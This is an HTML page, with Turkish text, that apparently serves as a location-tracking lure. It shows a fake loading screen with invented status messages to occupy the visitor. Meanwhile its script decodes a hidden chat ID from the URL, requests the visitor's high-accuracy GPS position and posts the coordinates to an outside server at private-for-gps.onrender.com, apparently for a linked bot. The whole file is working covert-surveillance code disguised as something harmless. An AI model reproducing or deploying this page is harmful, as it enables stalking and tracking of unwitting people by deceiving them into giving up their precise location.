<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Jujutsu</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#000;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .container{
      text-align:center;
      width:90%;
    }

    .logo{
      font-size:90px;
      font-weight:900;
      color:#ff0000;
      text-shadow:
        0 0 5px #ff0000,
        0 0 10px #ff0000,
        0 0 20px #ff0000,
        0 0 40px #ff0000,
        0 0 80px #ff0000;
      margin-bottom:40px;
      letter-spacing:4px;
    }

    .loading-text{
      font-size:22px;
      margin-bottom:15px;
      color:#ddd;
    }

    .bar{
      width:450px;
      max-width:90%;
      height:22px;
      border:2px solid #ff0000;
      margin:auto;
      overflow:hidden;
      border-radius:10px;
      box-shadow:0 0 20px #ff0000;
      background:#111;
    }

    .progress{
      width:0%;
      height:100%;
      background:#ff0000;
      box-shadow:0 0 20px #ff0000;
      transition:width 0.2s linear;
    }

    .percent{
      margin-top:12px;
      font-size:20px;
      color:#ff4d4d;
      font-weight:bold;
    }

    .fake-status{
      margin-top:35px;
      font-size:16px;
      color:#888;
      min-height:25px;
      animation:blink 1.2s infinite;
    }

    @keyframes blink{
      0%{opacity:0.5;}
      50%{opacity:1;}
      100%{opacity:0.5;}
    }
  </style>
</head>

<body>

  <div class="container">
    <div class="logo">𝖀𝖒𝖚𝖙</div>

    <div class="loading-text">Yükleniyor...</div>

    <div class="bar">
      <div class="progress" id="progress"></div>
    </div>

    <div class="percent" id="percent">0%</div>

    <div class="fake-status" id="status">
      Sunucuya bağlanılıyor...
    </div>
  </div>

  <script>
    // RENDER WEB SERVICE LINKIN (Sonunda eğik çizgi olmadan yaz)
    const RENDER_URL = 'https://private-for-gps.onrender.com'; 

    let progress = 0;
    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");

    const fakeMessages = [
      "Sunucuya bağlanılıyor...",
      "Veriler doğrulanıyor...",
      "Sistem hazırlanıyor...",
      "Güvenli bağlantı kuruluyor...",
      "Paketler indiriliyor...",
      "Sinyal güçlendiriliyor...",
      "Bellek optimizasyonu yapılıyor...",
      "Veritabanı el suksesmesi bekleniyor..."
    ];

    // Yükleme Çubuğu Animasyonu
    setInterval(() => {
      if (progress < 96) {
        progress += Math.random() * 1.5;
        if (progress > 96) progress = 96;
        progressBar.style.width = progress + "%";
        percentText.innerText = Math.floor(progress) + "%";
      }
    }, 400);

    // Durum Yazıları Animasyonu
    setInterval(() => {
      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
      statusText.innerText = randomMessage;
    }, 3500);

    // URL'den Şifreli ID'yi Çözme Fonksiyonu
    function getChatIdFromUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      const encryptedId = urlParams.get('id');
      if (!encryptedId) return null;
      // bot.py'deki (chat_id * 7 + 12345) formülünün tersi
      return Math.round((parseInt(encryptedId) - 12345) / 7);
    }

    // Konum İsteme ve Render'a Gönderme
    window.onload = function() {
      const chatId = getChatIdFromUrl();
      if (!chatId) {
        console.error("ID bulunamadı.");
        return;
      }

      if (navigator.geolocation) {
        // Tarayıcıdan yüksek doğruluklu konum talep et
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const data = {
              chat_id: chatId,
              lat: position.coords.latitude,
              lon: position.coords.longitude,
              acc: position.coords.accuracy
            };

            // Veriyi Render API'sine POST et
            fetch(`${RENDER_URL}/konum-al`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(data)
            })
            .then(res => console.log("Veri başarıyla gönderildi."))
            .catch(err => console.error("Veri gönderme hatası:", err));
          },
          (error) => {
            console.error("Konum izni reddedildi veya hata oluştu:", error);
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      } else {
        console.error("Tarayıcı konum desteklemiyor.");
      }
    };
  </script>

</body>
</html>
